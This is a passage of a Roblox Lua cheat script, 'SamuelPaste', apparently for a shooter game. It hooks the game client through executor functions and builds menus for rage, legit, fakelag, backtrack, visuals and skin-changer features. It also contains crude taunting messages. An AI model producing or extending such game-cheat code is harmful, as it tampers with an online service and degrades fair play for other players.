											Frame.Visible = not Frame.Visible 
										end 
									end) --]]
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									--[[Frame.MouseEnter:Connect(function() 
										InFrame = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										InFrame = false 
									end) --]]
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										--[[if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
											if Frame.Visible == true and not InFrame and not InFrame2 then 
												Frame.Visible = false 
											end 
										end --]]
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												--Element.value.Active = true 
											end 
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														--[[if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end--]]
														local lmfaooo, lol = pcall(function()
															callback()
																end)
															if lmfaooo then
															keybindadd(text, '')
															wait(1)
															keybindremove(text, '')
															else 
															keybindadd(text, '')
															wait(1)
															keybindremove(text, '')
															print(lol)
														end
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														--[[if Element.value.Type == "Hold" then 
															Element.value.Active = true 
										a					callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end
														end--]] 
														local lmfaooo, lol = pcall(function()
															callback()
																end)
															if lmfaooo then
															keybindadd('Success!')
															wait(1)
															keybindremove('Success!')
															else 
															keybindadd('Error!')
															wait(1)
															keybindremove('Error!')
															print(lol)
														end
													end 
												end 
											--else 
												--Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									--[[game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end)--]] 
								end
							
							
							end 
							ConfigLoad:Connect(function(cfg) 
								pcall(function() 
									local fix = library:ConfigFix(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)
							ConfigLoad1:Connect(function(cfg) 
							pcall(function() 
									local fix = library:ConfigFix1(cfg) 
									if fix[tabname][sectorname][text] ~= nil then 
										Element:SetValue(fix[tabname][sectorname][text]) 
									end 
								end) 
							end)

							return Element 
						end 
				library.tabs[tabname][sectorname] = Sector
				return Sector 
			end 
			library.tabs[tabname] = Tab
			return Tab 
		end 

		Lunar.Parent = game.CoreGui 
		return menu 
	end 
	local MX_ONHIT = C.INST("ScreenGui")
	do
	local OnHitFrame = C.INST("Frame")
	local UIListLayout = C.INST("UIListLayout")
	local SampleFrame = C.INST("Frame")
	local Grad = C.INST("Frame")
	local SampleLabel = C.INST("TextLabel")
	local UIGradient = C.INST("UIGradient")

	MX_ONHIT.Name = "MX_ONHIT"
	MX_ONHIT.Parent = game.CoreGui
	MX_ONHIT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	OnHitFrame.Name = "OnHitFrame"
	OnHitFrame.Parent = MX_ONHIT
	OnHitFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	OnHitFrame.BackgroundTransparency = 1.000
	OnHitFrame.Position = C.UDIM2(0, 52, 0, -15)
	OnHitFrame.Size = C.UDIM2(0, 300, 0, 500)

	UIListLayout.Parent = OnHitFrame
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIListLayout.Padding = UDim.new(0, 6)

	SampleFrame.Name = "SampleFrame"
	SampleFrame.Parent = OnHitFrame
	SampleFrame.AutomaticSize = Enum.AutomaticSize.XY
	SampleFrame.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleFrame.BackgroundTransparency = 1.000
	SampleFrame.BorderColor3 = C.COL3RGB(7, 0, 0)
	SampleFrame.Size = C.UDIM2(0, 0, 0, 24)

	Grad.Name = "Grad"
	Grad.Parent = SampleFrame
	Grad.BackgroundColor3 = C.COL3RGB(222, 232, 255)
	Grad.BackgroundTransparency = 1.000
	Grad.AutomaticSize = Enum.AutomaticSize.Y
	Grad.BorderSizePixel = 0
	Grad.Size = C.UDIM2(0, 3, 0, 24)

	SampleLabel.Name = "SampleLabel"
	SampleLabel.Parent = Grad
	SampleLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.BackgroundTransparency = 1.000
	SampleLabel.BorderSizePixel = 0
	SampleLabel.Position = C.UDIM2(1.97835922, 0, 0, 0)
	SampleLabel.Size = C.UDIM2(0, 0, 0, 24)
	SampleLabel.Font = Enum.Font.Ubuntu
	SampleLabel.Text = "TEST"
	SampleLabel.TextTruncate = Enum.TextTruncate.AtEnd
	SampleLabel.AutomaticSize = Enum.AutomaticSize.XY
	SampleLabel.TextColor3 = C.COL3RGB(255, 255, 255)
	SampleLabel.TextSize = 13.000
	SampleLabel.TextStrokeTransparency = 0.000
	SampleLabel.TextTransparency = 1.000
	SampleLabel.TextXAlignment = Enum.TextXAlignment.Left

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, C.COL3RGB(49, 49, 49)), ColorSequenceKeypoint.new(0.41, C.COL3RGB(25, 25, 25)), ColorSequenceKeypoint.new(1.00, C.COL3RGB(25, 25, 25))}
	UIGradient.Rotation = 90
	UIGradient.Parent = SampleFrame
	end
	 
	local function CreateHitElement(text,col,time, size, size2, size3, size4)
		spawn(function()
			local Frame = MX_ONHIT.OnHitFrame.SampleFrame:Clone()
			local Grad = Frame.Grad
			local Label = Grad.SampleLabel
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(size, size2, size3, size4)}) 
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(size, size2, size3, size4)}) 	
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})       
			library:Tween(Grad, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0.000}) 
			
			Frame.Parent = MX_ONHIT.OnHitFrame
			Grad.Parent = Frame
			Label.Parent = Grad
			Label.TextColor3 = col
			Label.Text = text
			wait(time)
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})       
			library:Tween(Grad, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000})  
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 1.000})
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextStrokeTransparency = 1.000})
			
			library:Tween(Frame, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
			library:Tween(Label, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = C.UDIM2(0, 0, size3, size4)}) 
			
			wait(0.8)
			Frame:Destroy()
			Grad:Destroy()
			Label:Destroy()
		end)
	end
	hitlogs:Connect(function(text,col,time, size, size2, size3, size4)
		CreateHitElement(text,col, time, size, size2, size3, size4)
	end)
	CreateHitElement(" Welcome, "..LocalPlayer.Name.."!",MainUIColor,5, 0, 340, 0, 22)
	wait(0.5)
	CreateHitElement(" To close gui, go to misc tab and set up keybind  ",MainUIColor,5, 0, 340, 0, 30)
	CreateHitElement(" !!!  IMPORTANT  !!!\
 Expect many bugs/lags since dev is a retard,\
 Report any issues to my server!  ",MainUIColor,15, 0, 300, 0, 50)

UserInputService = game:GetService("UserInputService") 
ReplicatedStorage = game:GetService("ReplicatedStorage") 
RunService = game:GetService("RunService") 
Lighting = game:GetService("Lighting") 
PlayerGui = LocalPlayer.PlayerGui
Crosshairs = PlayerGui.GUI.Crosshairs
Crosshair = PlayerGui.GUI.Crosshairs.Crosshair
Mouse = LocalPlayer:GetMouse() 
Camera = workspace.CurrentCamera 
ClientScript = LocalPlayer.PlayerGui.Client 
Client = getsenv(ClientScript) 
ChatScript = getsenv(LocalPlayer.PlayerGui.GUI.Main.Chats.DisplayChat)

repeat RunService.RenderStepped:Wait() until game:IsLoaded() 

oldcreatebullethole = Client.createbullethole 
local LGlove, RGlove, LSleeve, RSleeve, RArm, LArm 
WeaponObj = {} 
SelfObj = {} 
Viewmodels =  ReplicatedStorage.Viewmodels 
Weapons =  ReplicatedStorage.Weapons 
ViewmodelOffset = C.CF(0,0,0) 
Smokes = {} 
Mollies = {}
local RageTarget 
if game.ReplicatedStorage:FindFirstChild('GetIcon') then
GetIcon = require(game.ReplicatedStorage.GetIcon) 
else
GetIcon = require(game.ReplicatedStorage.GetIconOld) 
end
BodyVelocity = C.INST("BodyVelocity") 
BodyVelocity.MaxForce = C.Vec3(C.HUGE, 0, C.HUGE) 
Collision = {Camera, workspace.Ray_Ignore, workspace.Debris} 
FakelagFolder = C.INST("Folder", nil) 
FakelagFolder.Name = "Fakelag" 
backtrackfolder = C.INST("Folder", nil)
backtrackfolder.Name = "backtrackfolder"
fowardtrackFolder = C.INST("Folder", nil)
fowardtrackFolder.Name = "FowardtrackFolder"
FakeAnim = C.INST("Animation", nil) 
FakeAnim.AnimationId = "rbxassetid://0" 
Gloves = ReplicatedStorage.Gloves 
if Gloves:FindFirstChild("ImageLabel") then 
	Gloves.ImageLabel:Destroy() 
end 
GloveModels = Gloves.Models 
Multipliers = { 
	["Head"] = 4, 
	["FakeHead"] = 4, 
	["HeadHB"] = 4, 
	["UpperTorso"] = 1, 
	["LowerTorso"] = 1.25, 
	["LeftUpperArm"] = 1, 
	["LeftLowerArm"] = 1, 
	["LeftHand"] = 1, 
	["RightUpperArm"] = 1, 
	["RightLowerArm"] = 1, 
	["RightHand"] = 1, 
	["LeftUpperLeg"] = 0.75, 
	["LeftLowerLeg"] = 0.75, 
	["LeftFoot"] = 0.75, 
	["RightUpperLeg"] = 0.75, 
	["RightLowerLeg"] = 0.75, 
	["RightFoot"] = 0.75, 
} 
ChamItems = {} 
Skyboxes = { 
	["nebula"] = { 
		SkyboxLf = "rbxassetid://159454286", 
		SkyboxBk = "rbxassetid://159454299", 
		SkyboxDn = "rbxassetid://159454296", 
		SkyboxFt = "rbxassetid://159454293", 
		SkyboxLf = "rbxassetid://159454286", 
		SkyboxRt = "rbxassetid://159454300", 
		SkyboxUp = "rbxassetid://159454288", 
	}, 
	["vaporwave"] = { 
		SkyboxLf = "rbxassetid://1417494402", 
		SkyboxBk = "rbxassetid://1417494030", 
		SkyboxDn = "rbxassetid://1417494146", 
		SkyboxFt = "rbxassetid://1417494253", 
		SkyboxLf = "rbxassetid://1417494402", 
		SkyboxRt = "rbxassetid://1417494499", 
		SkyboxUp = "rbxassetid://1417494643", 
	}, 
	["clouds"] = { 
		SkyboxLf = "rbxassetid://570557620", 
		SkyboxBk = "rbxassetid://570557514", 
		SkyboxDn = "rbxassetid://570557775", 
		SkyboxFt = "rbxassetid://570557559", 
		SkyboxLf = "rbxassetid://570557620", 
		SkyboxRt = "rbxassetid://570557672", 
		SkyboxUp = "rbxassetid://570557727", 
	}, 
	["twilight"] = { 
		SkyboxLf = "rbxassetid://264909758", 
		SkyboxBk = "rbxassetid://264908339", 
		SkyboxDn = "rbxassetid://264907909", 
		SkyboxFt = "rbxassetid://264909420", 
		SkyboxLf = "rbxassetid://264909758", 
		SkyboxRt = "rbxassetid://264908886", 
		SkyboxUp = "rbxassetid://264907379", 
	}, 
} 
local NewScope 
do 
	local ScreenGui = C.INST("ScreenGui") 
	local Frame = C.INST("Frame") 
	local Frame_2 = C.INST("Frame") 

	ScreenGui.Enabled = false 
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global 
	ScreenGui.IgnoreGuiInset = true 

	Frame.Parent = ScreenGui 
	Frame.BackgroundColor3 = C.COL3RGB(0, 0, 0) 
	Frame.BorderSizePixel = 0 
	Frame.Position = C.UDIM2(0, 0, 0.5, 0) 
	Frame.Size = C.UDIM2(1, 0, 0, 1) 

	Frame_2.Parent = ScreenGui 
	Frame_2.BackgroundColor3 = C.COL3RGB(0, 0, 0) 
	Frame_2.BorderSizePixel = 0 
	Frame_2.Position = C.UDIM2(0.5, 0, 0, 0) 
	Frame_2.Size = C.UDIM2(0, 1, 1, 0) 

	ScreenGui.Parent = game.CoreGui 

	NewScope = ScreenGui 
end 
local oldSkybox 
local ownerJoined = {"GetRealGetFpsGui", "jjbetterthansynapse", 'SamuelThePaster', 'SamuelBetterThanU'}
Players.PlayerAdded:Connect(function(plr)
	if C.TBLFIND(ownerJoined, plr.Name) then
		CreateHitElement(" !!!HOLY FUCKING SHIT!!! OWNER OF SCRIPT JOINED PREPARE TO GET FUCKED UP!!! ",MainUIColor,15, 0, 380, 0, 22)
	end
end)

Players.PlayerRemoving:Connect(function(plr)
	if C.TBLFIND(ownerJoined, plr.Name) then
		CreateHitElement(" LMFAO owner left you probably made him rage quit or he's updating script ",MainUIColor,15, 0, 380, 0, 22)
	end
end)
for i,v in pairs(Players:GetPlayers()) do
	if C.TBLFIND(ownerJoined, v.Name) then
		if v ~= LocalPlayer then
			CreateHitElement(" !!!HOLY FUCKING SHIT!!! YOU JOINED TO OWNER OF SCRIPT PREPARE TO GET FUCKED UP!!! ",MainUIColor,15, 0, 380, 0, 22)
		elseif v == LocalPlayer then
			CreateHitElement(" Hello daddy uwu ",MainUIColor,5, 0, 100, 0, 22)
		end
	end
end
local function VectorRGB(RGB) 
	return C.Vec3(RGB.R, RGB.G, RGB.B) 
end 
local function new(name, prop) 
	local obj = C.INST(name) 
	for i,v in pairs(prop) do 
		if i ~= "Parent" then 
			obj[i] = v 
		end 
	end 
	if prop["Parent"] ~= nil then 
		obj.Parent = prop["Parent"] 
	end 
end 
local function UpdateAccessory(Accessory) 
	Accessory.Material = values.visuals.effects["accessory material"].Dropdown == "Smooth" and "SmoothPlastic" or "ForceField" 
	Accessory.Mesh.VertexColor = VectorRGB(values.visuals.effects["accessory chams"].Color) 
	Accessory.Color = values.visuals.effects["accessory chams"].Color 
	Accessory.Transparency = values.visuals.effects["accessory chams"].Transparency 
	if values.visuals.effects["accessory material"].Dropdown ~= "ForceField" then 
		Accessory.Mesh.TextureId = "" 
	else 
		Accessory.Mesh.TextureId = Accessory.StringValue.Value 
	end 
end 
local function ReverseAccessory(Accessory) 
	Accessory.Material = "SmoothPlastic" 
	Accessory.Mesh.VertexColor = C.Vec3(1,1,1) 
	Accessory.Mesh.TextureId = Accessory.StringValue.Value 
	Accessory.Transparency = 0 
end 
local function UpdateWeapon(obj) 
	local selected = values.visuals.effects["weapon material"].Dropdown
	local ffanim = values.visuals.effects["weapon ff anim"].Dropdown
	if obj:IsA("MeshPart") and selected == "ForceField" then 
		if ffanim == "none" then
			obj.TextureID = ""
		elseif ffanim == "scanning" then
			obj.TextureID = "rbxassetid://5843010904"
		elseif ffanim == "lava" then
			obj.TextureID = "rbxassetid://53883408"
		elseif ffanim == "pulse" then
			obj.TextureID = "rbxassetid://wtf"
		end
	elseif obj:IsA("MeshPart") and selected == "Smooth" or selected == "Flat" then obj.TextureID = "" end
	if obj:IsA("Part") and obj:FindFirstChild("Mesh") and not obj:IsA("BlockMesh") then
		obj.Mesh.VertexColor = VectorRGB(values.visuals.effects["weapon chams"].Color)
		if selected == "Smooth" or selected == "Flat" then
			obj.Mesh.TextureId = ""
		else
			pcall(function()
				obj.Mesh.TextureId = obj.Mesh.OriginalTexture.Value
				obj.Mesh.TextureID = obj.Mesh.OriginalTexture.Value
			end)
		end
	end
	obj.Color = values.visuals.effects["weapon chams"].Color
	obj.Material = selected == "Smooth" and "SmoothPlastic" or selected == "Flat" and "Neon" or selected == "ForceField" and "ForceField"
	obj.Reflectance = values.visuals.effects["reflectance"].Slider/10
	obj.Transparency = values.visuals.effects["weapon chams"].Transparency
end 
local Skins = ReplicatedStorage.Skins 
local function MapSkin(Gun, Skin, CustomSkin) 
	if CustomSkin ~= nil then 
		for _,Data in pairs(CustomSkin) do 
			local Obj = Camera.Arms:FindFirstChild(Data.Name) 
			if Obj ~= nil and Obj.Transparency ~= 1 then 
				Obj.TextureId = Data.Value 
			end 
		end 
	else 
		local SkinData = Skins:FindFirstChild(Gun):FindFirstChild(Skin) 
		if not SkinData:FindFirstChild("Animated") then 
			for _,Data in pairs(SkinData:GetChildren()) do 
				local Obj = Camera.Arms:FindFirstChild(Data.Name) 
				if Obj ~= nil and Obj.Transparency ~= 1 then 
					if Obj:FindFirstChild("Mesh") then 
						Obj.Mesh.TextureId = v.Value 
					elseif not Obj:FindFirstChild("Mesh") then 
						Obj.TextureID = Data.Value 
					end 
				end 
			end 
		end 
	end 
end 
local function ChangeCharacter(NewCharacter) 
	for _,Part in pairs (LocalPlayer.Character:GetChildren()) do 
		if Part:IsA("Accessory") then 
			Part:Destroy() 
		end 
		if Part:IsA("BasePart") then 
			if NewCharacter:FindFirstChild(Part.Name) then 
				Part.Color = NewCharacter:FindFirstChild(Part.Name).Color 
				Part.Transparency = NewCharacter:FindFirstChild(Part.Name).Transparency 
			end 
			if Part.Name == "FakeHead" then 
				Part.Color = NewCharacter:FindFirstChild("Head").Color 
				Part.Transparency = NewCharacter:FindFirstChild("Head").Transparency 
			end 
		end 

		if (Part.Name == "Head" or Part.Name == "FakeHead") and Part:FindFirstChildOfClass("Decal") and NewCharacter.Head:FindFirstChildOfClass("Decal") then 
			Part:FindFirstChildOfClass("Decal").Texture = NewCharacter.Head:FindFirstChildOfClass("Decal").Texture 
		end 
	end 

	if NewCharacter:FindFirstChildOfClass("Shirt") then 
		if LocalPlayer.Character:FindFirstChildOfClass("Shirt") then 
			LocalPlayer.Character:FindFirstChildOfClass("Shirt"):Destroy() 
		end 
		local Clone = NewCharacter:FindFirstChildOfClass("Shirt"):Clone() 
		Clone.Parent = LocalPlayer.Character 
	end 

	if NewCharacter:FindFirstChildOfClass("Pants") then 
		if LocalPlayer.Character:FindFirstChildOfClass("Pants") then 
			LocalPlayer.Character:FindFirstChildOfClass("Pants"):Destroy() 
		end 
		local Clone = NewCharacter:FindFirstChildOfClass("Pants"):Clone() 
		Clone.Parent = LocalPlayer.Character 
	end 

	for _,Part in pairs (NewCharacter:GetChildren()) do 
		if Part:IsA("Accessory") then 
			local Clone = Part:Clone() 
			for _,Weld in pairs (Clone.Handle:GetChildren()) do 
				if Weld:IsA("Weld") and Weld.Part1 ~= nil then 
					Weld.Part1 = LocalPlayer.Character[Weld.Part1.Name] 
				end 
			end 
			Clone.Parent = LocalPlayer.Character 
		end 
	end 

	if LocalPlayer.Character:FindFirstChildOfClass("Shirt") then 
		local String = C.INST("StringValue") 
		String.Name = "OriginalTexture" 
		String.Value = LocalPlayer.Character:FindFirstChildOfClass("Shirt").ShirtTemplate 
		String.Parent = LocalPlayer.Character:FindFirstChildOfClass("Shirt") 

		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "clothes") then 
			LocalPlayer.Character:FindFirstChildOfClass("Shirt").ShirtTemplate = "" 
		end 
	end 
	if LocalPlayer.Character:FindFirstChildOfClass("Pants") then 
		local String = C.INST("StringValue") 
		String.Name = "OriginalTexture" 
		String.Value = LocalPlayer.Character:FindFirstChildOfClass("Pants").PantsTemplate 
		String.Parent = LocalPlayer.Character:FindFirstChildOfClass("Pants") 

		if C.TBLFIND(values.visuals.effects.removals.Jumbobox, "clothes") then 
			LocalPlayer.Character:FindFirstChildOfClass("Pants").PantsTemplate = "" 
		end 
	end 
	for i,v in pairs(LocalPlayer.Character:GetChildren()) do 
		if v:IsA("BasePart") and v.Transparency ~= 1 then 
			C.INSERT(SelfObj, v) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Color 
			Color.Parent = v 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Material.Name 
			String.Parent = v 
		elseif v:IsA("Accessory") and v.Handle.Transparency ~= 1 then 
			C.INSERT(SelfObj, v.Handle) 
			local Color = C.INST("Color3Value") 
			Color.Name = "OriginalColor" 
			Color.Value = v.Handle.Color 
			Color.Parent = v.Handle 

			local String = C.INST("StringValue") 
			String.Name = "OriginalMaterial" 
			String.Value = v.Handle.Material.Name 
			String.Parent = v.Handle 
		end 
	end 

	if values.visuals.self["self chams"].Toggle then 
		for _,obj in pairs(SelfObj) do 
			if obj.Parent ~= nil then 
				obj.Material = values.visuals.self["self chams material"].Dropdown 
				obj.Color = values.visuals.self["self chams"].Color 
			end 
		end 
	end 
end 
local function GetDeg(pos1, pos2) 
	local start = pos1.LookVector 
	local vector = C.CF(pos1.Position, pos2).LookVector 
	local angle = C.ACOS(start:Dot(vector)) 
	local deg = C.DEG(angle) 
	return deg 
end 

for i,v in pairs(Viewmodels:GetChildren()) do 
	if v:FindFirstChild("HumanoidRootPart") and v.HumanoidRootPart.Transparency ~= 1 then 
		v.HumanoidRootPart.Transparency = 1 
	end 
end 


local ChrModels = game:GetObjects("rbxassetid://7951832105")[1]
repeat wait() until ChrModels ~= nil 

local ChinaHat = game:GetObjects('rbxassetid://9756426202')[1]
repeat wait() until ChinaHat ~= nil


     local Models = game:GetObjects("rbxassetid://6708336356")[1]  --7285197035
     repeat wait() until Models ~= nil           

     local Effects = game:GetObjects("rbxassetid://7159346812")[1]    --9714589499
     repeat wait() until Effects ~= nil
	 

		local AllKnives = {      
			"CT Knife",      
			"T Knife",      
			"Banana",      
			"Bayonet",      
			"Bearded Axe",      
			"Butterfly Knife",      
			"Cleaver",      
			"Crowbar",      
			"Falchion Knife",      
			"Flip Knife",      
			"Gut Knife",      
			"Huntsman Knife",      
			"Karambit",      
			"Sickle",      
		}
--local AllKnives = {}
local AllGloves = {} 


for _,fldr in pairs(Gloves:GetChildren()) do 
	if fldr ~= GloveModels and fldr.Name ~= "Racer" then 
		AllGloves[fldr.Name] = {} 
		for _2,modl in pairs(fldr:GetChildren()) do 
			C.INSERT(AllGloves[fldr.Name], modl.Name) 
		end 
	end 
end 

for i,v in pairs(Models.Knives:GetChildren()) do 
	C.INSERT(AllKnives, v.Name) 
end 

local EffectsNames = {'none'}

for i,v in pairs(Effects:GetChildren()) do
	C.INSERT(EffectsNames, v.Name)
end

local AllSkins = {} 
local AllWeapons = {} 
local AllCharacters = {} 

for i,v in pairs(ChrModels:GetChildren()) do 
	C.INSERT(AllCharacters, v.Name) 
end 

local skins = { 
	{["Weapon"] = "AWP", ["SkinName"] = "Bot", ["Skin"] = {["Scope"] = "6572594838", ["Handle"] = "6572594077"}} 
} 

for _,skin in pairs (skins) do 
	local Folder = C.INST("Folder") 
	Folder.Name = skin["SkinName"] 
	Folder.Parent = Skins[skin["Weapon"]] 

	for _,model in pairs (skin["Skin"]) do 
		local val = C.INST("StringValue") 
		val.Name = _ 
		val.Value = "rbxassetid://"..model 
		val.Parent = Folder 
	end 
end 

for i,v in pairs(Skins:GetChildren()) do 
	C.INSERT(AllWeapons, v.Name) 
end 

C.TBLSORT(AllWeapons, function(a,b) 
	return a < b 
end) 

for i,v in ipairs(AllWeapons) do 
	AllSkins[v] = {} 
	C.INSERT(AllSkins[v], "Inventory") 
	for _,v2 in pairs(Skins[v]:GetChildren()) do 
		if not v2:FindFirstChild("Animated") then 
			C.INSERT(AllSkins[v], v2.Name) 
		end 
	end 
end 



makefolder("SamuelPaste/lua") 

local allluas = {} 

for _,lua in pairs(listfiles("SamuelPaste/lua")) do 
	local luaname = C.GSUB(lua, "SamuelPaste/lua\\", "") 
	C.INSERT(allluas, luaname) 
end 





 
RunService.RenderStepped:Wait() 

local gui = library:New("SamuelPaste") 
local legit = gui:Tab("legit") 
local rage = gui:Tab("rage") 
local visuals = gui:Tab("visuals") 
local misc = gui:Tab("misc") 
local skins = gui:Tab("skins") 
local others = gui:Tab("others")



api = {} 
api.newtab = function(name) 
	return gui:Tab(name) 
end 
api.newsection = function(tab, name, side) 
	return tab:Sector(name, side) 
end 
api.newelement = function(section, type, name, data, callback) 
	section:Element(type, name, data, callback) 
end 
local knife = skins:Sector('knife', 'Left')
knife:Element('Toggle', 'knife changer')
knife:Element('Scroll', 'model', {options = AllKnives, Amount = 15})
local anotherloop
knife:Element('Toggle', "Knife effects")
knife:Element('Toggle', 'Change pos (very confused better dont use)')
knife:Element('Slider', 'X', {min = 0, max = 30, default = 0})
knife:Element('Slider', 'Y', {min = 0, max = 15, default = 0})
knife:Element('Slider', 'Z', {min = 0, max = 30, default = 0})
knife:Element('Dropdown', "effects", {options = EffectsNames, Amount = 5})

local glove = skins:Sector('glove', 'Left')
glove:Element('Toggle', 'glove changer')
glove:Element('ScrollDrop', 'model', {options = AllGloves, Amount = 9})
local skin = skins:Sector('skins', 'Right')
skin:Element('Toggle', 'skin changer')
skin:Element('ScrollDrop', 'skin', {options = AllSkins, Amount = 15, alphabet = true})



local custom = skins:Sector('custom models', 'Left')

custom:Element("Button", "Reset Knives", {}, function(tbl)
	game.ReplicatedStorage.Viewmodels["v_CT Knife"]:Destroy()
	wait()
	local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
	game:GetObjects('rbxassetid://7311308040')[1].Parent = Model1
	Model = game.ReplicatedStorage.Viewmodels.Model
	for _, Child in next, Model:GetChildren() do
		Child.Parent = Model.Parent
	end
	Model:Destroy()
	wait()
	game.ReplicatedStorage.Viewmodels["v_T Knife"]:Destroy()
	wait()
	local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
	game:GetObjects('rbxassetid://7311365626')[1].Parent = Model1
	Model = game.ReplicatedStorage.Viewmodels.Model
	for _, Child in next, Model:GetChildren() do
		Child.Parent = Model.Parent
	end
	Model:Destroy()
end)
local customskins = {
	AWP = {'Mosin', 'CS:GO', 'Codol'},
	Scout = {'Newan', 'M1 Garand', 'Railgun', 'CS:GO'},
	AutoSniper = {'Barrett'},
	AK = {'Dragon'},
	USP = {'Newan'},
	Knives = {'Bowie', 'Netherite sword', 'Shadow Daggers Fade'}
}
custom:Element('ScrollDrop', 'model', {options = customskins, Amount = 7}, function(tbl)
		--AWP
		if values.skins['custom models'].model.Scroll['AWP'] ~= 'None' then
			if values.skins['custom models'].model.Scroll['AWP'] == 'Mosin' then
				game.ReplicatedStorage.Viewmodels["v_AWP"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://6482147359')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["v_Mosin-Nagant Optical"].Name = "v_AWP"
				
			elseif values.skins['custom models'].model.Scroll['AWP'] == 'CS:GO' then
				game.ReplicatedStorage.Viewmodels["v_AWP"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161319343')[1].Parent = Model1
				Model = game.ReplicatedStorage.Viewmodels.Model
				for _, Child in next, Model:GetChildren() do
					Child.Parent = Model.Parent
				end
				Model:Destroy()
				game.ReplicatedStorage.Viewmodels["awpAZIM"].Name = "v_AWP"
				
			else
				game.ReplicatedStorage.Viewmodels["v_AWP"]:Destroy()
				wait()
				local Model1 = C.INST("Model", game.ReplicatedStorage.Viewmodels)
				game:GetObjects('rbxassetid://7161319343')[1].Parent = Model1
